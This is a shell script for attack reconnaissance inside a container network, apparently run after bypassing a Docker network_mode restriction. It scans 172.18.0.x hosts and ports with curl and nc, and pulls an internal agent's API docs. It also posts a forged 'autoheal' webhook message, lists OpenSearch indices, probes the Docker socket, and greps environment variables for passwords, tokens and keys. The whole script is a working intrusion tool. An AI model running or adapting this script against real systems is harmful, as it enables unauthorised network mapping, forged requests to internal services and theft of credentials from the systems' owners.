#!/bin/sh
exec > /scout/results.txt 2>&1

echo "=== SCOUT: network_mode host via include bypass ==="
echo "Time: $(date -u +%Y-%m-%dT%H:%M:%SZ)"
echo ""

echo "=== INTERFACES ==="
ip -4 addr show
echo ""

echo "=== ROUTES ==="
ip route show
echo ""

echo "=== AGENT HUNT: 172.18.0.x:8000 ==="
for i in $(seq 1 15); do
  RESULT=$(curl -s -m 2 -o /dev/null -w "%{http_code}" "http://172.18.0.$i:8000/health")
  if [ "$RESULT" != "000" ]; then
    echo "*** AGENT at 172.18.0.$i:8000 → HTTP $RESULT ***"
    curl -sv -m 3 "http://172.18.0.$i:8000/health"
    echo ""
    curl -sv -m 3 "http://172.18.0.$i:8000/"
    echo ""
    curl -sv -m 3 "http://172.18.0.$i:8000/docs"
    echo ""
    curl -sv -m 3 "http://172.18.0.$i:8000/openapi.json" | head -100
    echo ""
    echo "--- WEBHOOK ---"
    curl -sv -m 3 -X POST "http://172.18.0.$i:8000/webhooks/autoheal" \
      -H "Content-Type: application/json" \
      -d '{"content":"Container network-mode-host-proof_00000000-0000 (unhealthy) restarted"}'
    echo ""
  fi
done
echo ""

echo "=== OPENSEARCH: 172.18.0.x:9200 ==="
for i in $(seq 1 15); do
  RESULT=$(curl -s -m 2 -o /dev/null -w "%{http_code}" "http://172.18.0.$i:9200/")
  if [ "$RESULT" != "000" ]; then
    echo "*** ES at 172.18.0.$i:9200 → HTTP $RESULT ***"
    curl -s -m 3 "http://172.18.0.$i:9200/"
    echo ""
    curl -s -m 3 "http://172.18.0.$i:9200/_cat/indices?v" | head -30
    echo ""
  fi
done
echo ""

echo "=== AMQP: 172.18.0.x:5672 + 15672 ==="
for i in $(seq 1 15); do
  nc -z -w1 172.18.0.$i 5672 2>/dev/null && echo "AMQP: 172.18.0.$i:5672 OPEN"
  nc -z -w1 172.18.0.$i 15672 2>/dev/null && echo "RabbitMQ Mgmt: 172.18.0.$i:15672 OPEN"
done
echo ""

echo "=== FULL PORT SCAN: 172.18.0.1-10 ==="
for i in $(seq 1 10); do
  for port in 22 53 80 443 2375 4243 5432 5672 6379 8000 8080 9090 9100 9200 9443 15672 27017 27110; do
    nc -z -w1 172.18.0.$i $port 2>/dev/null && echo "172.18.0.$i:$port OPEN"
  done
done
echo ""

echo "=== DOCKER SOCKET ==="
ls -la /var/run/docker.sock 2>&1
curl -s --unix-socket /var/run/docker.sock http://localhost/version 2>&1 | head -20
echo ""

echo "=== LOCALHOST SERVICES ==="
for port in 8000 5672 9200 2375 8080 9090 15672; do
  nc -z -w1 127.0.0.1 $port 2>/dev/null && echo "localhost:$port OPEN"
done
echo ""

echo "=== ENV VARS (look for creds) ==="
env | grep -iE "rabbit|amqp|elastic|opensearch|redis|mongo|password|secret|token|key|agent" 2>&1
echo ""

echo "=== done ==="

tail -f /dev/null
